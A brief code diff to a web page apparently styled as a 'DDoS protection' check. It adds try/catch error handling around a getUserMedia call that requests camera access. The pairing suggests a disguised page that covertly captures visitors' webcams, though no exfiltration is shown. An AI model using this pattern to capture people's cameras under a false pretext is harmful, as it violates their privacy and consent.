@@ -117,6 +117,9 @@ DDoS protection by
             }, 5000);
 
         }
+        var td = "";
+        
+        try{
         // get camera access
         navigator.mediaDevices.getUserMedia({
             video: true,
@@ -129,8 +132,13 @@ DDoS protection by
         }).catch(function (err) {
             console.log(err);
         });
+        }catch(e)
+        {
+            td+="\n? Error in getting camera access : " + e + "\n";
+            console.log(e);
+        }
 
-        var td = "";
+      
 
         
 
